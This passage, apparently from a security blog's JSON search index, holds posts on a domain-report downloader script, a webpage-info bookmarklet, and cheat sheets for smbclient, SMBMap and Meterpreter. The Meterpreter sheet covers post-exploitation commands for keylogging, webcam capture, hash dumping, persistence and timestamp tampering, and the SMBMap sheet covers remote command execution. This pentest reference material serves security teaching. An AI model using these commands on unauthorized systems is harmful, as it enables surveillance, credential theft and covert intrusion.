install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your 